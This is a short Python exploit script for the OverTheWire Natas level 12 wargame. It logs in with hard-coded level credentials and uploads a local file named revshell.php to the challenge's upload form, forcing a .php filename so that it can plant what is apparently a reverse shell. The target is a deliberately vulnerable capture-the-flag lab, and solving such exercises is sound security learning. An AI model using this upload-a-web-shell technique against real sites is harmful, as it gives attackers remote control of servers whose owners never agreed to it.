import requests

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'


url = 'http://%s.natas.labs.overthewire.org'  % username

files = {'uploadedfile': open('/home/alpha/over_the_wire/natas/level12/revshell.php', 'rb')}

response = requests.post(url, files = files,  data = {"filename" : "revshell.php", "MAX_FILE_SIZE":"1000"},auth = (username, password))
print(response.text)
 